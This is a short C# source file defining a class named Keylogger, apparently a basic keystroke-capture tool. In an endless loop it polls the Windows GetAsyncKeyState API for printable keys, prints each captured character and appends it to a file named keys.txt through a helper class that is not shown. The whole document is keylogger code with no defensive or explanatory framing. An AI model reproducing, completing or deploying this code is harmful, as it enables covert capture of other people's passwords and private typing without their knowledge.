using System.Runtime.InteropServices;

public class Keylogger
{

    [DllImport("User32.dll")]
    public static extern int GetAsyncKeyState(Int32 i);
    public void getKeys()
    {
        string text = "";
        while (true)
        {
            Thread.Sleep(5);

            for (int i = 32; i < 127; i++)
            {
                int keyState = GetAsyncKeyState(i);
                if (keyState == 32769)
                {
                    Console.Write((char)i + "|");
                    text = text + (char)i;
                    FileManagement wr = new FileManagement();  
                    wr.WriteData("keys.txt", text);
                    text = "";
                }
            }
        }
    }
}